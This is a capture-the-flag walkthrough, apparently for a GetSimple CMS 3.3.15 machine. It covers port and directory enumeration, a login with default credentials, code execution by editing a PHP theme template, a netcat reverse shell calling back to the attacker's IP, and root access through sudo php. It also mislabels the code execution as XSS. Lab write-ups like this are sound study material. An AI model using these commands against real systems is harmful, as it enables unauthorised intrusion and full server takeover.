#Enumeration
--
Using nmap to scan the IP \
```nmap -sV -sC -O -Pn -T4 + $IP```\
Discover port 22 (SSH) and 80 (HTTP) => scan all port -p- in the background => no more discover\
Access through browser => found the comment on HTML contain /admin/ folder\
Using Gobuster to quick scan other directory => found some other like data, theme,...\
Access the /admin/ directory => got the login page of GetSimple CMS => try some common credential like admin:admin => succeed login\
Confirm by the admin.xml file in /data/users/ => discover the username admin with hashed password (google => found "admin")

#Web Page exploit
--
Looking around all module of the page => Found GetSimple version 3.3.15 => searchsploit find some XSS vuln for version <=3.3.15\
Discover that there are some XSS in the theme edit function => try to access and edit the template \
=> replace the whole PHP script in template.php with <?php system ("id"); ?>\
Access the php file through /theme/ => the result return the ID command output => confirm XSS vuln

#Gain foothold
--
Replace with the reverse shell script\
```<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP $PORT >/tmp/f"); ?>```\
Open listening port on the local machine
```nc -lvnp $PORT```\
Access the php file => got the shell and flag\
Using the following code to gain TTY\
```python3 -c 'import pty; pty.spawn("/bin/bash")'```\
Got the flag

#PrivEsc
--
Try discover any sudo command can be used\
```sudo -l```\
Got the /bin/php\
Look on the GTFOBins => found a script for PrivEsc\
```sudo php -r "system(/bin/sh);"```\
Got the root priv => got the flag

